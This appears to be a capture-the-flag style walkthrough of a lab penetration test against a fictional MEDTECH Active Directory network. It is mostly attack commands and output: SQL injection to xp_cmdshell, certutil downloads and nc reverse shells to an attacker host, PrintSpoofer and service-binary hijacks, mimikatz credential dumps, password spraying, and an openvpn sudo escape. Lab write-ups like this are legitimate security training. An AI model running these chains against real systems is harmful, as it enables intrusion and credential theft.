# Questions
We have been tasked to conduct a penetration test for MEDTECH a recently formed IoT healthcare startup. Our objective is to find as many vulnerabilities and misconfigurations as possible in order to increase their Active Directory security posture and reduce the attack surface.

The organization topology diagram is shown below and the public subnet network resides in the 192.168.xx.0/24 range, where the xx of the third octet can be found under the IP ADDRESS field in the control panel.

# Machine
VM1 172.16.219.10
VM2 172.16.219.11
VM3 192.168.219.120 (WEB01.DMZ.MEDTECH.COM)
VM4 192.168.219.121 (WEB02.DMZ.MEDTECH.COM)
VM5 192.168.219.122 (VPN.DMZ.MEDTECH.COM)
VM6 172.16.219.12
VM7 172.16.219.13
VM8 172.16.219.14
VM9 172.16.219.82
VM10 172.16.219.83

# Nmap Public subnet network (192.168.xx.120-122)
sudo nmap -sC -sV -T4 192.168.219.120
# VM3 
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
# VM4
80/tcp  open  http          Microsoft IIS httpd 10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
smb2-security-mode
 Message signing enabled but not required
# VM5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
1194/tcp open  openvpn

# Find any directory we can use
# VM3
gobuster dir -u http://192.168.219.120 -w /home/kali/Tools/dict/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://192.168.219.121/FUZZ -r
...
/about                (Status: 301) [Size: 44] [--> http://192.168.219.120/about/]
/static               (Status: 301) [Size: 46] [--> http://192.168.219.120/static/]
/assets               (Status: 301) [Size: 46] [--> http://192.168.219.120/assets/]
...
# VM4
gobuster dir -u http://192.168.219.121 -w /home/kali/Tools/dict/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
ffuf -w /usr/share/wordlists/wfuzz/general/megabeast.txt -u http://192.168.219.121/FUZZ -r

# None of the directory worth to go indepth, lets proceed to the MedTech Patient Portal that we found from Make an Appointment button. 
http://192.168.219.121/login.aspx

# Lets try with the weak password admin:admin Failed :D
# Lets try with BlindSQLi
UsernameTextBox=1';EXECUTE sp_configure 'show advanced options', 1;--
UsernameTextBox=1';RECONFIGURE;--
UsernameTextBox=1';EXECUTE sp_configure 'xp_cmdshell', 1;--
UsernameTextBox=1';RECONFIGURE;--
UsernameTextBox=1';EXEC xp_cmdshell "certutil.exe -urlcache -f http://192.168.45.195:8088/met.exe C:\TEMP\met.exe";--
...
192.168.219.121 - - [28/May/2024 08:05:44] "GET /met.exe HTTP/1.1" 200 -
...
# Our https feedback with 200, means it is able to use SQLi!
# Lets listen to 8443 and establish the connection with VM3
UsernameTextBox=1';EXEC xp_cmdshell "cmd /c C:\TEMP\met.exe";--
# Go to the Metasplolit listener
C:\Windows\system32>whoami
nt service\mssql$sqlexpress
C:\Windows\system32>hostname
WEB02
# Now we identify the VM3 machine is WEB02

# Lets upload WinPEAS to check the machine
certutil.exe -urlcache -f http://192.168.45.195:8088/Windows/winPEASx64.exe C:/TEMP/winPEAS.exe
...
web.config found a password: WhileChirpTuesday218
...

cat web.config
```
<add name="myConnectionString" connectionString="server=localhost\SQLEXPRESS;database=webapp;uid=sa;password=WhileChirpTuesday218;Trusted_Connection=False;MultipleActiveResultSets=true; Integrated Security=False; Max Pool Size=500;" />
```
# We have a SQL server credentials here

# But idk how to use HAHA, lets see the privilege that this user have
whoami /priv
...
SeAssignPrimaryTokenPrivilege Replace a process level token    Disabled
SeIncreaseQuotaPrivilege   Adjust memory quotas for a process     Disabled
SeChangeNotifyPrivilege   Bypass traverse checking                  Enabled 
SeManageVolumePrivilege  Perform volume maintenance tasks          Enabled 
SeImpersonatePrivilege   Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege  Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set    Disabled
...
# SeImpersonatePrivilege is enabled
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
# We can abuse it to get the NT AUTHORITY\SYSTEM level access
# Lets utilize one of the PrintSpoofer tools

PS C:\temp> iwr -uri http://192.168.45.195:8088/Windows/Priv-Esc/PrintSpoofer64.exe -Outfile Printspoof.exe
PS C:\TEMP> iwr -uri http://192.168.45.195:8088/Reverse-Shell/nc.exe -Outfile nc.exe
C:\TEMP>Printspoofer.exe -c "C:\TEMP\nc.exe 192.168.45.195 4444 -e powershell"

--------------------------------------------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege                                        
[+] Named pipe listening...                                                        
[+] CreateProcessAsUser() OK                                                       
# Go to listener
PS C:\Windows\system32> whoami
nt authority\system

# Lets try mimikatz.exe
PS C:\temp> iwr -uri http://192.168.45.177:8088/Windows/mimikatz.exe -Outfile mimi.exe
PS C:\temp> powershell -ep bypass
PS C:\temp> .\mimi.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
...
         * Username : Administrator
         * Domain   : WEB02
         * NTLM     : b2c03054c306ac8fc5f9d188710b0168
         * Username : joe
         * Domain   : MEDTECH
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494
         kerberos :
         * Username : joe
         * Domain   : MEDTECH.COM
         * Password : Flowers1
...
PS C:\Users\Administrator\Desktop> type proof.txt
a21cde38548900a820e8aeb8f25295f0

# Lets enable WEB02 for RDP
PS C:\TEMP> Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
xfreerdp /cert-ignore /u:joe /p:Flowers1 /v:192.168.219.121 /d:medtech.com +clipboard +drive:/home/kali/Desktop,/smb

# Extract Domain information using the PowerView.ps1
iwr -uri http://192.168.45.221:8088/Windows/PowerView.ps1 -Outfile PowerView.ps1
powershell -ep bypass
Import-Module .\PowerView.ps1
Get-NetUser -Domain medtech.com 
Get-NetComputer -Properties samaccountname, samaccounttype, operatingsystem
Get-NetGroup -Domain medtech.com| select name
Get-DomainGroupMember "Domain Admins" -Recurse

# Now we owned the joe:Flowers1 credentials, we can try the crackmapexec to find out what joe can access

# Before that lets establish the connection with WEB02 and dynamic port forward from WEB02 and allow KALI route to MEDTECH internal network

[Metasploit Dynamic Port Forwarding]
=====================================================
# Lets create a MSFpayload first
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.45.195 LPORT=8888 -f exe -o cute.exe
# Metasploit Dynamic Port Forwarding
https://github.com/twelvesec/port-forwarding?tab=readme-ov-file#SSH-Remote-Port-Forwarding
msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
set LHOST tun0
set LPORT 8888
set ExitonSession False
# WEB02
PS C:\TEMP> iwr -uri http://192.168.45.195:8088/cute.exe -Outfile cute.exe
PS C:\TEMP> .\cute.exe
# KALI
# While it had established the sessions, lets create a route first
msf6 exploit(multi/handler) > use multi/manage/autoroute
msf6 post(multi/manage/autoroute) > show options
msf6 post(multi/manage/autoroute) > set session 1
msf6 post(multi/manage/autoroute) > run
[+] Route added to subnet 192.168.219.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 172.16.219.0/255.255.255.0 from host's routing table.
msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1081
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
# Open new shell
sudo nano /etc/proxychains4.conf
...
socks5 127.0.0.1 1081
...
=====================================================

[Chisel Dynamic Port Forwarding]
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html

./chisel server -p 8889 --reverse --socks5
./chisel.exe client 192.168.45.195:8889 R:socks
# Open new shell
sudo nano /etc/proxychains4.conf
...
socks5 127.0.0.1 1080
...

# Lets try to access MEDTECH internal network
proxychains -q nmap -sT -Pn 172.16.219.10-14
proxychains -q nmap -sT -Pn 172.16.219.82-83
code targets.txt

# Crackmapexec 
https://notes.benheater.com/books/active-directory/page/crackmapexec
proxychains crackmapexec smb targets.txt -u joe -p 'Flowers1' -d medtech.com --continue-on-success
...
SMB         172.16.219.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:medtech.com) (signing:True) (SMBv1:False)
SMB         172.16.219.11   445    FILES02          [*] Windows Server 2022 Build 20348 x64 (name:FILES02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.219.12   445    DEV04            [*] Windows Server 2022 Build 20348 x64 (name:DEV04) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.219.13   445    PROD01           [*] Windows Server 2022 Build 20348 x64 (name:PROD01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.219.82   445    CLIENT01         [*] Windows 11 Build 22000 x64 (name:CLIENT01) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.219.83   445    CLIENT02         [*] Windows 11 Build 22000 x64 (name:CLIENT02) (domain:medtech.com) (signing:False) (SMBv1:False)
SMB         172.16.219.10   445    DC01             [+] medtech.com\joe:Flowers1 
SMB         172.16.219.11   445    FILES02          [+] medtech.com\joe:Flowers1 (Pwn3d!)
SMB         172.16.219.12   445    DEV04            [+] medtech.com\joe:Flowers1 
SMB         172.16.219.13   445    PROD01           [+] medtech.com\joe:Flowers1 
SMB         172.16.219.82   445    CLIENT01         [+] medtech.com\joe:Flowers1 
SMB         172.16.219.83   445    CLIENT02         [+] medtech.com\joe:Flowers1 
...

# Lets try smbexec
proxychains impacket-smbexec medtech/joe@172.16.219.11
Password: Flowers1
proxychains impacket-psexec joe:Flowers1@172.16.219.11
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>hostname
FILES02
C:\Windows\system32>type C:\Users\Administrator\Desktop\proof.txt
b7c78e2cbd8ac3719174d61dfed42d77
C:\Users\joe\Desktop> type local.txt
430fa7151cd2ae0f950243a7ba2f1889


proxychains -q xfreerdp /u:joe /p:Flowers1 /d:medtech.com  /v:172.16.219.11
# From the Joe desktop there is a local file, which are one of the flag
type local.txt
430fa7151cd2ae0f950243a7ba2f1889

C:\TEMP> certutil.exe -urlcache -f http://192.168.45.195:8088/Windows/winPEASx64.exe C:\Temp\winpeas.exe
C:\TEMP> ./winpeas.exe
...

...
# Powershell Console Host History
PS C:\TEMP> cat C:\Users\wario\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
$username='wario';
$credential = New-Object System.Management.Automation.PSCredential $username,$secureString;
New-PSSession -ComputerName 172.16.50.83 -Credential $credential 
New-PSSession -ComputerName CLIENT02 -Credential $credential 
hostname
exit
```
# Check Mimikatz can retrieve any users
PS C:\TEMP> iwr -uri http://192.168.45.195:8088/Windows/mimikatz.exe -Outfile mimi.exe
mimikatz # privilege::debug
Privilege '20' OK
...
         * Username : Administrator
         * Domain   : FILES02
         * NTLM     : f1014ac49bae005ee3ece5f47547d185
...
# joe Documents fileMonitorbackup.loh
PS C:\Users\joe\Documents> type fileMonitorBackup.log
...
Backup      daisy      6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
Backup      toad       6872 Backup Completed. NTLM: 5be63a865b65349851c1f11a067a3068  
Backup      wario      6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e
Backup      goomba     6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
...
# Lets crack them using hashcat
code user-ntlm.hash
# wario
fdf36048c1cf88f5630381c5e38feb8e:Mushroom!                                     
Session..........: hashcat
Status...........: Cracked

# Based on the Console Host History, we know wario can access to the CLIENT02. Lets try to access it using evilwinrm
proxychains -q  evil-winrm -i 172.16.219.83 -u wario -p 'Mushroom!'
*Evil-WinRM* PS C:\Users\wario\Desktop> type local.txt
97e71ac29c6a43778ab6f2488a34490f
*Evil-WinRM* PS C:\DevelopmentExecutables> ls
-a----         10/5/2022  11:05 PM          25600 auditTracker.exe
*Evil-WinRM* PS C:\DevelopmentExecutables> icacls .
...
. Everyone:(OI)(CI)(F)
  BUILTIN\Administrators:(I)(OI)(CI)(F)
  NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
  BUILTIN\Users:(I)(OI)(CI)(RX)
  NT AUTHORITY\Authenticated Users:(I)(M)
  NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)
...
# Everyone have full access
# We can query the serviceConfig
*Evil-WinRM* PS C:\DevelopmentExecutables> cmd /c sc qc auditTracker
...
SERVICE_NAME: auditTracker
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\DevelopmentExecutables\auditTracker.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : auditTracker
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
...

# We can replace it with our reverse-shell
*Evil-WinRM* PS C:\DevelopmentExecutables> certutil -urlcache -split -f http://192.168.45.195:8088/cute.exe
*Evil-WinRM* PS C:\DevelopmentExecutables> copy cute.exe auditTracker.exe
# Lets restart auditTracker.exe service using powershell command
*Evil-WinRM* PS C:\DevelopmentExecutables> Restart-Service -Force -Name auditTracker

# Go back to the Msfconsole
[*] Command shell session 3 opened (192.168.45.195:8888 -> 192.168.219.121:64749) at 2024-05-30 07:55:01 -0700
sessions -i 3
C:\>whoami
nt authority\system
PS C:\Users\Administrator\Desktop> type proof.txt
3af4fed1bce9fe14175fa10ea6823064

# Check Powershell Console History
PS C:\Users\Administrator> type C:\Users\administrator.MEDTECH\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
...
Enable-PSRemoting -Force
exit
Set-Item WSMan:\localhost\Client\TrustedHosts -value *
winrm
winrm s winrm/config/client '@{TrustedHosts="FILES02"}'
winrm quickconfig
exit
winrm s winrm/config/client '@{TrustedHosts="FILES02"}'
winrm s winrm/config/client '@{TrustedHosts=*}'
winrm s winrm/config/client '@{TrustedHosts="MEDTECH\FILES02"}'
winrm s winrm/config/client '@{TrustedHosts="FILES02"}'
Set-Item WSMan:\localhost\Client\TrustedHosts -value "*" -Force
winrm configSDDL default
shutdown /s
...

# Nothing much, let try with password spray to other CLIENT01 to check any repeated password using
sudo proxychains -q crackmapexec smb 172.16.219.82 -u user.txt -p pass.txt -d 'medtech.com' --continue-on-success
...
SMB         172.16.219.82   445    CLIENT01         [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
...
# Access using psexec
proxychains -q impacket-psexec yoshi:"Mushroom\!"@172.16.219.82
Get-ChildItem -Path C:\Users -Filter *.txt -Recurse
C:\Users\Administrator\Desktop> type proof.txt
36ef079b57b37e43f92e8f08c5b6263d

# Remember the above that DEV04 is able to RDP, lets try with password spray first
proxychains -q crackmapexec rdp 172.16.219.12 -u user.txt -p pass.txt -d medtech.com --continue-on-success
...
RDP         172.16.219.12   3389   DEV04            [+] medtech.com\yoshi:Mushroom! (Pwn3d!)
...
proxychains -q xfreerdp /cert-ignore /u:medtech.com\\yoshi /p:Mushroom\! /v:172.16.219.12 +clipboard +drive:/home/kali/Desktop,/smb
PS C:\Users\yoshi\Desktop> type .\local.txt
e1a547095f672913a0b0db9dc679ac0a

# Lets check winpeas
PS C:\Users\yoshi\Desktop> iwr -uri http://192.168.45.195:8088/Windows/winPEASx64.exe -Outfile winpeas.exe
# Add Color to CMD
PS C:\Users\yoshi\Desktop> REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 
C:\Users\yoshi\Desktop> .\winpeas.exe
...
C:\Users\yoshi\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
File Permissions "C:\TEMP\backup.exe": yoshi [WriteData/CreateFiles]
...

# Found a backup.exe able to write by yoshi
# Check if it is a service
C:\TEMP> cmd /c sc qc backup
# Unfortunately nope
# Check if scheduler task will run this backup file
C:\TEMP> schtasks /query /fo LIST /v
PS C:\Temp> copy .\cute.exe C:\Temp\backup.exe

# Go to MSFConsole
[*] Command shell session 4 opened (192.168.45.195:8888 -> 192.168.219.121:63112) at 2024-05-30 08:45:44 -0700
msf6 exploit(multi/handler) > sessions -i 4
C:\Windows\system32>whoami
nt authority\system
# Find flags
Get-ChildItem -Path C:\Users -Filter *.txt -Recurse
PS C:\Users\Administrator\Desktop> type proof.txt
d659731cc6abe49c08e9338a30ed9d3c

# use Mimikatz to capture any information
PS C:\Temp> .\mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
...
         * Username : leon
         * Domain   : MEDTECH
         * NTLM     : 2e208ad146efda5bc44869025e06544a
        kerberos :
         * Username : leon
         * Domain   : MEDTECH.COM
         * Password : rabbit:)
...

# We owned domain admin now!!
# We can use it to access the rest machine VM01 and VM07 to capture flag

# Lets start from VM01
proxychains -q impacket-psexec leon:"rabbit:)"@172.16.219.10
C:\Windows\system32> hostname
DC01
Get-ChildItem -Path C:\Users -Filter *.txt -Recurse
PS C:\Users\Administrator\Desktop> type proof.txt
89e42753586054af7d6f31475d40a3ae
PS C:\Users\Administrator\Desktop> type credentials.txt
web01: offsec/century62hisan51

# VM07
proxychains -q impacket-psexec leon:"rabbit:)"@172.16.219.13
C:\Windows\system32> hostname
PROD01
Get-ChildItem -Path C:\Users -Filter *.txt -Recurse
PS C:\Users\Administrator\Desktop> type proof.txt
0a90f9aae8350a7f6ee8f6b129115d21

# VM03
ssh offsec@192.168.219.120 
Password: century62hisan51
offsec@WEB01:~$ cat .bash_history
...
history 
su root
su - root
exit
sudo su
exit
...
offsec@WEB01:~$ sudo -l
...
    (ALL) NOPASSWD: ALL
    (ALL : ALL) NOPASSWD: ALL
...
# NOPASSWD :D
offsec@WEB01:~$ sudo su
root@WEB01:~# cat proof.txt
9ae9516fbba424c41bf440a948e093db

# Now we left VM05 and VM08, I cant access to VM08 using domain admin.. Lets go with VM05 VPN server first
hydra -L user.txt  -P /usr/share/wordlists/rockyou.txt  ssh://192.168.219.122
...
[22][ssh] host: 192.168.219.122   login: offsec   password: password
...
ssh offsec@192.168.219.122
offsec:~$ cat local.txt
3ed505103653c81acf6e590cb7a1da89
offsec:~$ sudo -l
...
Matching Defaults entries for offsec on vpn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User offsec may run the following commands on vpn:
    (ALL : ALL) /usr/sbin/openvpn
...
offsec:~$ cat .lhistory
...
 sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
exit
...
# Should be the GTFObins
offsec:~$ sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
whoami
root
pwd
/root
cat proof.txt
8896aea8de995db514c706a43901878a
cd /home
ls -al
mario offsec
cd mario
cd .ssh
cat id_rsa

# Lets use mario's id_rsa from VPN
mario-idrsa
# Troubleshoot!
# Use ssh-keygen from putty to convert it into OpenSSH (force new format)
# Save it to mariokey
chmod 600 mariokey
proxychains -q ssh -i mariokey mario@172.16.219.14
cat local.txt
6b8884d0d472f98a10a6419dd29df638